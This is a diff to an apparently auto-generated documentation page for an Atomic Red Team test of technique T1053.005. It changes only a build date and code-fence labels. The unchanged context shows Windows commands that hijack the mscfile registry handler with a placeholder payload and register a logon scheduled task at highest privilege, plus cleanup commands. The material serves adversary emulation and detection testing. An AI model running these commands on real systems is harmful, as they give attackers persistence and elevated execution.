@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1053.005"
 attack_technique_name: "Scheduled Task/Job: Scheduled Task"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2"
@@ -60,7 +60,7 @@ This technique abuses scheduled tasks and registry modifications to hijack legit
 
 ### Command
 
-```commandprompt
+```cmd
 reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f
 schtasks /Create /TN "#{task_name}" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
 ECHO Let's open the Computer Management console now...
@@ -69,7 +69,7 @@ compmgmt.msc
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
 schtasks /Delete /TN "#{task_name}" /F
 ```
